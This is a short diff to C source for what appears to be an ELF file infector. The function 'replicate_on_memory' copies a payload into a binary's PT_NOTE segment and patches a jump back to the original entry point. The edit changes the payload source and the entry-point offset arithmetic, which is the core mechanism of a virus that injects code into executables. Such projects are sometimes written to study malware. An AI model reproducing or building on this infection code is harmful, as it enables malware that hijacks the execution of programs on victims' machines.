@@ -32,10 +32,10 @@ static void replicate_on_memory(const struct s_info *info, char *ptr)
 	char *dst;
 	unsigned char *src;
 	unsigned long back = 0;
-	const Elf64_Addr entry_point = (info->old_entry - info->new_entry) - (PAYLOAD_SIZE);
+	const Elf64_Addr entry_point = info->old_entry - (info->new_entry) - 66;
 
 	dst = ptr + info->note->p_offset;
-	src = (unsigned char *)&test;
+	src = (unsigned char *)&constructor;
 
 	for (unsigned long index = 0; index < PAYLOAD_SIZE; index++)
 	{
@@ -43,7 +43,7 @@ static void replicate_on_memory(const struct s_info *info, char *ptr)
 			back = index + 1;
 		*dst++ = *src++;
 	}
-	
+
 	_memcpy(ptr + info->note->p_offset + back, &entry_point, sizeof(int));
 }
 
